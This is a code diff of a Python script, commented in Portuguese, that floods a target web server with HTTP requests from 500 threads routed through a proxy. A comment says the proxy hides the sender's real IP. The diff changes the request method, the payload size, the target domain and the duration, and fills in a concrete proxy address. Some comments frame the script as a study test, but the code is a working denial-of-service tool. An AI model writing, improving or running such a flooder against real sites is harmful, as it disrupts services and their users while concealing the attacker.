@@ -16,17 +16,18 @@ def flood_attack_via_proxy(target_ip, target_port, duration, proxy):
         "http": proxy,
         "https": proxy,
     }
-    payload = b"A" * 4096  # Pacote de dados
+    payload = b"A" * 10  # Pacote de dados
     timeout = time.time() + duration
     while time.time() < timeout:
         try:
-            response = client.get(f"http://{target_ip}:{target_port}", data=payload)
+            # Use `client.post` para enviar payloads de dados, ou remova `data=payload`
+            response = client.post(f"http://{target_ip}:{target_port}", timeout=10)
         except Exception as e:
             print(f"Erro ao enviar pacote via proxy: {e}")
     client.close()
 
 def main():
-    target_host = "sitetest.com.br"  # Link do Alvo.
+    target_host = "link.com"  # Use apenas o domínio sem o protocolo.
     try:
         target_ip = socket.gethostbyname(target_host)
         print(f"IP do site resolvido: {target_ip}")
@@ -35,13 +36,13 @@ def main():
         return
     
     target_port = 80  # Porta do serviço HTTP.
-    duration = 10  # Duração do teste em segundos - reduzir ou aumentar conforme precisar para seus testes.
+    duration = 15  # Duração do teste em segundos.
     threads = []
     
-    # Ocultar seu IP real
-    proxy = "http://<proxy_ip>:<proxy_port>"  # Substitua pelo seu proxy
+    # Defina o proxy corretamente
+    proxy = "http://18.228.149.161:80"  # Substitua pelo seu proxy
 
-    # Aumenta ou diminuir o número de threads de acordo com o que necessitar para os seus testes de estudo.
+    # Criação de múltiplas threads para o teste
     for i in range(500):  
         thread = threading.Thread(target=flood_attack_via_proxy, args=(target_ip, target_port, duration, proxy))
         thread.start()
